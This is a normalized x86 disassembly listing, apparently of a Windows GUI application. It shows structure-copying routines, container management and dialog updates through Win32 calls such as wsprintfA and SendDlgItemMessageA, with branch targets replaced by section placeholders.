mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_448640
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x38 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_448be0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
mov eax edi
shl eax 0x5
add ecx eax
mov eax [ esi + 0x8 ]
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_448640
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edx edi
cmp eax edx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
add ecx ebx
shl edi 0x5
add edi ebx
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_448e00
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
add edi eax
test ecx ecx
je r-xdata
add eax edi
sub_449540
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0550
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_448640
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_448700
test al al
je r-xdata
sub_4495e0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ edi + 0x4 ]
test edx edx
je r-xdata
mov ecx esi
call sub_448e30
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov ebp [ edi + 0x8 ]
mov eax ebp
sub eax edx
sar eax 0x5
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx ecx
sar ebx 0x5
xor ebx ebx
jmp r-xdata
test ecx ecx
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push ecx
push ebp
push edx
call sub_448110
mov ecx [ esi + 0x8 ]
add esp 0x10
push ecx
push eax
mov ecx esi
call sub_448e00
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
cmp eax ebx
ja r-xdata
mov ebx [ esi + 0xc ]
sub ebx ecx
sar ebx 0x5
xor ebx ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
mov eax [ esi + 0x4 ]
sar edi 0x5
shl edi 0x5
add edi eax
mov [ esi + 0x8 ] edi
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edi edi
shl edi 0x5
add edi eax
mov [ esi + 0x8 ] edi
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_448e00
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
mov ecx [ edi + 0x4 ]
add esp 0x4
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
cmp eax ebx
ja r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push ecx
push eax
push edi
mov ecx esi
call sub_449020
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_448700
test al al
je r-xdata
shl eax 0x5
add eax edx
mov ebx eax
mov eax [ esp + 0x14 ]
push eax
push ecx
push ebx
push edx
call sub_448110
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov edi [ edi + 0x8 ]
push ecx
push esi
push eax
push edi
push ebx
call sub_448640
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_449740
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0728
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x5
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0x18 ]
cmp edx eax
jae r-xdata
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
sar edx 0x5
cmp eax edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x5
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x24
mov ecx [ esp + 0x20 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push ecx
mov edx esp
mov [ esp + 0x1c ] esp
mov [ edx ] edi
mov edx [ ecx + 0x4 ]
push ecx
shl eax 0x5
mov esi esp
add eax edx
mov [ esi ] eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] esp
push eax
call sub_448f00
sub eax edx
mov edx [ ecx + 0x8 ]
lea esi [ esp + 0x1c ]
push esi
push eax
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] edx
call sub_449240
jmp r-xdata
sub_449810
push 0xffffffff
push sub_4c05ab
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
mov ebx [ esp + 0x18 ]
mov eax [ ebx ]
push ebp
push esi
push edi
mov ebp ecx
push 0xffffffff
lea ecx [ ebp + 0x4 ]
xor esi esi
mov [ ebp ] eax
push esi
lea edx [ ebx + 0x4 ]
mov edi 0xf
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
push edx
mov [ esp + 0x1c ] ebp
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
lea eax [ ebx + 0x20 ]
push eax
lea ecx [ ebp + 0x20 ]
mov [ esp + 0x20 ] esi
call sub_449540
mov cl [ ebx + 0x30 ]
mov [ ebp + 0x30 ] cl
mov edx [ ebx + 0x34 ]
push 0xffffffff
lea ecx [ ebp + 0x38 ]
mov [ ebp + 0x34 ] edx
push esi
lea eax [ ebx + 0x38 ]
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
push eax
mov [ esp + 0x28 ] 0x1
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
lea esi [ ebx + 0x54 ]
lea edi [ ebp + 0x54 ]
mov ecx 0x41
[ edi ] [ esi ]
mov ecx [ ebx + 0x158 ]
mov [ ebp + 0x158 ] ecx
mov edx [ ebx + 0x15c ]
mov [ ebp + 0x15c ] edx
mov eax [ ebx + 0x160 ]
mov [ ebp + 0x160 ] eax
mov ecx [ ebx + 0x164 ]
mov [ ebp + 0x164 ] ecx
mov edx [ ebx + 0x168 ]
mov [ ebp + 0x168 ] edx
mov eax [ ebx + 0x16c ]
mov [ ebp + 0x16c ] eax
mov ecx [ ebx + 0x170 ]
mov [ ebp + 0x170 ] ecx
mov edx [ ebx + 0x174 ]
mov [ ebp + 0x174 ] edx
mov eax [ ebx + 0x178 ]
mov [ ebp + 0x178 ] eax
mov ecx [ ebx + 0x17c ]
mov [ ebp + 0x17c ] ecx
mov edx [ ebx + 0x180 ]
mov [ ebp + 0x180 ] edx
mov eax [ ebx + 0x184 ]
mov [ ebp + 0x184 ] eax
mov ecx [ ebx + 0x188 ]
mov [ ebp + 0x188 ] ecx
mov edx [ ebx + 0x18c ]
lea ecx [ ebp + 0x190 ]
mov [ ebp + 0x18c ] edx
mov edi 0xf
xor esi esi
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
mov [ esp + 0x1c ] 0x2
mov [ ecx + 0x4 ] 0x0
push 0xffffffff
push esi
lea eax [ ebx + 0x190 ]
push eax
call sub_401dd0
push 0xffffffff
lea ecx [ ebp + 0x1ac ]
push esi
lea edx [ ebx + 0x1ac ]
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
push edx
mov [ esp + 0x28 ] 0x3
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
push 0xffffffff
lea ecx [ ebp + 0x1c8 ]
push esi
lea eax [ ebx + 0x1c8 ]
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
push eax
mov [ esp + 0x28 ] 0x4
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
push 0xffffffff
lea ecx [ ebp + 0x1e4 ]
push esi
lea edx [ ebx + 0x1e4 ]
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] esi
push edx
mov [ esp + 0x28 ] 0x5
mov [ ecx + 0x4 ] 0x0
call sub_401dd0
mov eax [ ebx + 0x200 ]
mov [ ebp + 0x200 ] eax
mov cl [ ebx + 0x204 ]
mov [ ebp + 0x204 ] cl
mov dl [ ebx + 0x205 ]
mov [ ebp + 0x205 ] dl
mov al [ ebx + 0x206 ]
mov [ ebp + 0x206 ] al
mov cl [ ebx + 0x207 ]
mov [ ebp + 0x207 ] cl
mov dl [ ebx + 0x208 ]
mov [ ebp + 0x208 ] dl
mov al [ ebx + 0x209 ]
mov [ ebp + 0x209 ] al
mov cl [ ebx + 0x20a ]
pop edi
mov [ ebp + 0x20a ] cl
mov ecx [ esp + 0x10 ]
pop esi
mov eax ebp
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_449a60
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
imul esi esi 0x20c
add esi eax
mov eax [ esi ]
push 0xffffffff
push 0x0
lea edx [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
push edx
call sub_401dd0
lea eax [ esi + 0x20 ]
push eax
mov ecx rw-data
call sub_4495e0
mov cl [ esi + 0x30 ]
mov [ rw-data ] cl
mov edx [ esi + 0x34 ]
push 0x0
lea eax [ esi + 0x38 ]
mov [ rw-data ] edx
mov ecx [ esi + 0x34 ]
push eax
push ecx
call sub_419810
add esp 0xc
lea edx [ esi + 0x54 ]
push edx
push rw-data
call [ lstrcpyA@IAT ]
mov eax [ esi + 0x158 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x15c ]
mov [ rw-data ] ecx
mov edx [ esi + 0x160 ]
mov [ rw-data ] edx
mov eax [ esi + 0x164 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x168 ]
mov [ rw-data ] ecx
mov edx [ esi + 0x16c ]
mov [ rw-data ] edx
mov eax [ esi + 0x170 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x174 ]
mov [ rw-data ] ecx
mov edx [ esi + 0x178 ]
mov [ rw-data ] edx
mov eax [ esi + 0x17c ]
mov [ rw-data ] eax
mov ecx [ esi + 0x180 ]
mov [ rw-data ] ecx
mov edx [ esi + 0x184 ]
mov [ rw-data ] edx
mov eax [ esi + 0x188 ]
push 0xffffffff
mov [ rw-data ] eax
mov ecx [ esi + 0x18c ]
push 0x0
lea edx [ esi + 0x190 ]
mov [ rw-data ] ecx
push edx
mov ecx rw-data
call sub_401dd0
push 0xffffffff
push 0x0
lea eax [ esi + 0x1ac ]
push eax
mov ecx rw-data
call sub_401dd0
push 0xffffffff
push 0x0
lea ecx [ esi + 0x1c8 ]
push ecx
mov ecx rw-data
call sub_401dd0
push 0xffffffff
push 0x0
lea edx [ esi + 0x1e4 ]
push edx
mov ecx rw-data
call sub_401dd0
mov eax [ esi + 0x200 ]
mov [ rw-data ] eax
mov cl [ esi + 0x204 ]
mov [ rw-data ] cl
mov dl [ esi + 0x205 ]
mov [ rw-data ] dl
mov al [ esi + 0x206 ]
mov [ rw-data ] al
mov cl [ esi + 0x207 ]
mov [ rw-data ] cl
mov dl [ esi + 0x208 ]
mov [ rw-data ] dl
mov al [ esi + 0x209 ]
mov [ rw-data ] al
mov cl [ esi + 0x20a ]
mov [ rw-data ] cl
pop esi
retn
sub_449c30
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax [ edi ]
mov esi ecx
push 0xffffffff
push 0x0
lea ecx [ edi + 0x4 ]
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_401dd0
lea edx [ edi + 0x20 ]
push edx
lea ecx [ esi + 0x20 ]
call sub_4495e0
mov al [ edi + 0x30 ]
push 0xffffffff
mov [ esi + 0x30 ] al
mov ecx [ edi + 0x34 ]
push 0x0
lea edx [ edi + 0x38 ]
mov [ esi + 0x34 ] ecx
push edx
lea ecx [ esi + 0x38 ]
call sub_401dd0
mov ecx edi
lea eax [ esi + 0x54 ]
sub ecx esi
mov ebp 0x104
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec ebp
jne r-xdata
mov eax [ edi + 0x158 ]
mov [ esi + 0x158 ] eax
mov ecx [ edi + 0x15c ]
mov [ esi + 0x15c ] ecx
mov edx [ edi + 0x160 ]
mov [ esi + 0x160 ] edx
mov eax [ edi + 0x164 ]
mov [ esi + 0x164 ] eax
mov ecx [ edi + 0x168 ]
mov [ esi + 0x168 ] ecx
mov edx [ edi + 0x16c ]
mov [ esi + 0x16c ] edx
mov eax [ edi + 0x170 ]
mov [ esi + 0x170 ] eax
mov ecx [ edi + 0x174 ]
mov [ esi + 0x174 ] ecx
mov edx [ edi + 0x178 ]
mov [ esi + 0x178 ] edx
mov eax [ edi + 0x17c ]
mov [ esi + 0x17c ] eax
mov ecx [ edi + 0x180 ]
mov [ esi + 0x180 ] ecx
mov edx [ edi + 0x184 ]
mov [ esi + 0x184 ] edx
mov eax [ edi + 0x188 ]
push 0xffffffff
mov [ esi + 0x188 ] eax
mov ecx [ edi + 0x18c ]
push 0x0
lea edx [ edi + 0x190 ]
mov [ esi + 0x18c ] ecx
push edx
lea ecx [ esi + 0x190 ]
call sub_401dd0
push 0xffffffff
push 0x0
lea eax [ edi + 0x1ac ]
push eax
lea ecx [ esi + 0x1ac ]
call sub_401dd0
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c8 ]
push ecx
lea ecx [ esi + 0x1c8 ]
call sub_401dd0
push 0xffffffff
push 0x0
lea edx [ edi + 0x1e4 ]
push edx
lea ecx [ esi + 0x1e4 ]
call sub_401dd0
mov eax [ edi + 0x200 ]
mov [ esi + 0x200 ] eax
mov cl [ edi + 0x204 ]
mov [ esi + 0x204 ] cl
mov dl [ edi + 0x205 ]
mov [ esi + 0x205 ] dl
mov al [ edi + 0x206 ]
mov [ esi + 0x206 ] al
mov cl [ edi + 0x207 ]
mov [ esi + 0x207 ] cl
mov dl [ edi + 0x208 ]
mov [ esi + 0x208 ] dl
mov al [ edi + 0x209 ]
mov [ esi + 0x209 ] al
mov cl [ edi + 0x20a ]
pop edi
mov [ esi + 0x20a ] cl
mov eax esi
pop esi
pop ebp
retn 0x4
sub_449e00
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_448f60
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_449e30
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x5
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_449240
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x5
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_448be0
add esp 0x14
add edi 0x20
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_449ea0
push ecx
mov al [ esp + 0x3 ]
push esi
mov esi ecx
mov [ esi ] al
call sub_448010
mov [ esi + 0x4 ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
pop ecx
retn
sub_449ee0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ esp + 0x18 ]
push ebx
mov ecx esi
call sub_449c30
add esi 0x20c
cmp esi edi
jne r-xdata
pop ebx
sub_449f10
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push esi
mov ecx edi
call sub_449c30
add esi 0x20c
add edi 0x20c
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_449f50
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
sub esi 0x20c
sub edi 0x20c
push esi
mov ecx edi
call sub_449c30
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_449fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c05d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x20c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x20c
jmp r-xdata
push edi
mov ecx esi
call sub_449810
cmp edi [ ebp + 0xc ]
je r-xdata
sub_449ffc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_449110
add esi 0x20c
cmp esi edi
jne r-xdata
sub_44a040
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c05eb
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi edi
je r-xdata
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
mov ecx [ rw-data ]
cmp ecx edi
mov [ esp + 0x138 ] edi
je r-xdata
mov eax [ rw-data ]
sub eax esi
sar eax 0x5
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax edi
jle r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp edx edi
jne r-xdata
mov ebp 0x10
mov eax [ esp + 0x28 ]
mov ebp 0x10
cmp eax ebp
mov [ esp + 0x138 ] 0xffffffff
jb r-xdata
mov ebp [ wsprintfA@IAT ]
mov eax [ rw-data ]
mov esi [ rw-data ]
mov ebx eax
sub ebx esi
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x130 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
cmp esi [ rw-data ]
je r-xdata
mov esi [ rw-data ]
xor edi edi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
jmp r-xdata
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
mov ecx rw-data
mov [ esp + 0x30 ] esi
call sub_449e30
mov eax [ rw-data ]
mov esi edi
cmp esi eax
jl r-xdata
xor esi esi
lea ebx [ edx - 0x1 ]
mov ebx eax
jmp r-xdata
cmp [ esi + 0x18 ] ebp
jb r-xdata
mov ebx [ esp + 0x140 ]
cmp ebx edi
jl r-xdata
lea edi [ esi + 0x1 ]
push edi
lea ecx [ esp + 0x34 ]
push r--data
push ecx
call ebp
lea eax [ esp + 0x3c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
jmp r-xdata
imul esi esi 0x70
jmp r-xdata
cmp esi ebx
mov edi esi
jg r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov edx [ esi + ecx + 0x18 ]
mov eax 0x10
cmp edx eax
jb r-xdata
sub eax ecx
push 0x0
push eax
mov ecx esi
call sub_4017f0
push 0xffffffff
push eax
mov ecx esi
call sub_401ba0
jmp r-xdata
push eax
call sub_458010
mov ecx [ esi + 0x14 ]
add esp 0x4
cmp eax ecx
ja r-xdata
lea ebp [ esi + ecx + 0x4 ]
mov ebp [ esi + ecx + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_401cc0
mov eax [ rw-data ]
add esi 0x20
cmp esi eax
jne r-xdata
mov edx [ ebx * 4 + rw-data ]
mov eax edx
lea edi [ eax + 0x1 ]
lea ecx [ esi + ecx + 0x4 ]
mov ecx [ esi + ecx + 0x4 ]
jmp r-xdata
cmp [ esi + ecx + 0x18 ] eax
jb r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebp
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
mov [ esp + 0x2c ] edi
call sub_447fd0
lea ecx [ esp + 0x10 ]
push ecx
mov ecx rw-data
call sub_449e30
inc edi
add esi 0x70
cmp edi ebx
jle r-xdata
push ecx
call sub_457f40
add esp 0x4
add eax ebp
mov ecx eax
lea ebp [ ecx + 0x1 ]
mov ecx [ rw-data ]
lea esp [ esp ]
sub_44a2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c068b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x7b0
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor edi edi
cmp eax edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
jne r-xdata
mov esi [ rw-data ]
sub esi eax
sar esi 0x5
xor esi esi
jmp r-xdata
cmp [ ebx + 0x28 ] 0x10
mov [ ebp - 0x4 ] 0x3
jb r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ ebp + 0xb ]
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x84 ] edi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] al
call sub_448010
mov [ ebp - 0x8c ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ ebp - 0x8c ]
mov [ eax + 0x4 ] eax
mov eax [ ebp - 0x8c ]
mov [ eax ] eax
mov eax [ ebp - 0x8c ]
mov [ eax + 0x8 ] eax
mov [ ebp - 0x88 ] edi
mov ecx [ rw-data ]
inc ecx
push ecx
mov [ ebp - 0x4 ] edi
call sub_46fbb0
add esp 0x4
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] edi
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0x20 ] edi
mov al [ rw-data ]
test al al
mov [ ebp - 0x4 ] 0x2
jne r-xdata
lea eax [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0x2
je r-xdata
inc [ edi + 0x4 ]
push 0x6
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
mov edi eax
add esp 0x18
test edi edi
je r-xdata
mov [ ebp - 0x50 ] 0x0
lea edx [ ebp - 0xec ]
push edx
push r--data
call sub_404790
add esp 0x8
test eax eax
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
lea eax [ ebp - 0xec ]
push eax
push r--data
call sub_404790
add esp 0x8
test eax eax
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov esi eax
mov al [ ebx + 0x8 ]
shl esi 0x5
test al al
mov edx [ ecx + esi + 0x1c ]
mov [ ebp - 0x14 ] edx
je r-xdata
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov eax 0x10
cmp ecx eax
jae r-xdata
mov [ ebp - 0x1c ] 0xfffffffe
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
push 0x1
jne r-xdata
test edi edi
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov [ ebp - 0x1c ] 0xfffffffe
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdce
push eax
call edi
mov ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd5
push ecx
call edi
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x50 ]
push edx
inc eax
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0x10
lea edx [ ebp - 0x324 ]
push edx
push 0xdcf
push eax
call edi
mov ecx [ ebp - 0x50 ]
mov edx [ ebx + 0x4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push ecx
push 0x402
push 0xdd1
push edx
call edi
mov eax [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x402
push 0xdd2
push eax
call edi
xor ecx ecx
mov eax 0xf
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x78 ] cl
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x40 ] cl
mov edx [ rw-data ]
push 0xffffffff
push ecx
lea eax [ edx + esi ]
push eax
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x18 ] 0x1
call sub_401dd0
mov al [ rw-data ]
test al al
je r-xdata
mov [ ebp - 0x1c ] 0x1
cmp [ rw-data ] eax
mov edx [ rw-data ]
jae r-xdata
mov edi rw-data
mov ecx [ rw-data ]
dec ecx
push ecx
call sub_46fbb0
mov eax [ ebp - 0xd8 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov [ eax ] edi
call sub_405f20
add esp 0x4
test eax eax
jne r-xdata
inc [ edi + 0x4 ]
mov al [ rw-data ]
test al al
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
